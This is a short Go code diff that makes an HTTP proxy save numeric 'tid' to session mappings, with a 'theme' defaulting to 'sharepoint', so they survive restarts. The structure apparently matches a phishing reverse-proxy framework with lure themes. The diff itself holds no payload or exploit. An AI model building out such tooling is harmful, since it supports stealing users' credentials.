@@ -1082,6 +1082,7 @@ func generateNumericTid() string {
 }
 
 // storeTidMapping stores a mapping from numeric tid to session info
+// Also stores in session custom fields for persistence across restarts
 func (p *HttpProxy) storeTidMapping(tid, sessionID, theme string) {
 	p.tidMtx.Lock()
 	defer p.tidMtx.Unlock()
@@ -1090,14 +1091,54 @@ func (p *HttpProxy) storeTidMapping(tid, sessionID, theme string) {
 		Theme:     theme,
 		CreatedAt: time.Now(),
 	}
+	// Also persist to session custom fields for restart recovery
+	p.session_mtx.Lock()
+	if s, ok := p.sessions[sessionID]; ok {
+		s.Custom["dc_tid"] = tid
+		s.Custom["dc_theme"] = theme
+	}
+	p.session_mtx.Unlock()
+	// Persist to database
+	go func() {
+		p.db.SetSessionCustom(sessionID, "dc_tid", tid)
+		p.db.SetSessionCustom(sessionID, "dc_theme", theme)
+	}()
 }
 
 // getTidMapping retrieves session info from a numeric tid
+// Falls back to searching sessions if not in memory (recovery after restart)
 func (p *HttpProxy) getTidMapping(tid string) (*tidMapping, bool) {
 	p.tidMtx.RLock()
-	defer p.tidMtx.RUnlock()
 	m, ok := p.tidMappings[tid]
-	return m, ok
+	p.tidMtx.RUnlock()
+	if ok {
+		return m, true
+	}
+	
+	// Fallback: search sessions for matching tid (handles restart recovery)
+	p.session_mtx.Lock()
+	for sessionID, s := range p.sessions {
+		if s.Custom != nil && s.Custom["dc_tid"] == tid {
+			theme := s.Custom["dc_theme"]
+			if theme == "" {
+				theme = "sharepoint"
+			}
+			// Re-add to memory cache
+			p.tidMtx.Lock()
+			p.tidMappings[tid] = &tidMapping{
+				SessionID: sessionID,
+				Theme:     theme,
+				CreatedAt: time.Now(),
+			}
+			m = p.tidMappings[tid]
+			p.tidMtx.Unlock()
+			p.session_mtx.Unlock()
+			log.Debug("[tidMapping] recovered mapping for tid %s -> session %s from session data", tid, sessionID)
+			return m, true
+		}
+	}
+	p.session_mtx.Unlock()
+	return nil, false
 }
 
 func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
